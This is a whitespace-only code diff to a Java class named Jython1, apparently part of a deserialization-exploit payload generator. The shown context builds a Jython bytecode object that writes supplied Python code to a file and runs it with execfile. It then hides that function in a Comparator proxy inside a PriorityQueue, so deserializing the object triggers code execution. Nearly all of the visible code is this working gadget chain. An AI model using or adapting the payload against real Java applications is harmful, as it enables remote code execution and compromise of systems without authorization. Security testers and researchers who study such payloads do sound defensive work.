@@ -81,7 +81,7 @@ public class Jython1 implements ObjectPayload<PriorityQueue> {
 
         // Helping consts and names
         PyObject[] consts = new PyObject[]{new PyString(""), new PyString(paths[1]), new PyString("w+"), new PyString(python_code)};
-        String[]   names  = new String[]{"open", "write", "close", "execfile"};
+        String[] names = new String[]{"open", "write", "close", "execfile"};
 
         // Generating PyBytecode wrapper for our python bytecode
         PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{"", ""}, "noname", "<module>", 0, "");
@@ -91,9 +91,9 @@ public class Jython1 implements ObjectPayload<PriorityQueue> {
         PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);
 
         // Prepare Trigger Gadget
-        Comparator            comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, (InvocationHandler) handler);
+        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, (InvocationHandler) handler);
         PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
-        Object[]              queue         = new Object[]{1, 1};
+        Object[] queue = new Object[]{1, 1};
         Reflections.setFieldValue(priorityQueue, "queue", queue);
         Reflections.setFieldValue(priorityQueue, "size", 2);
         return priorityQueue;
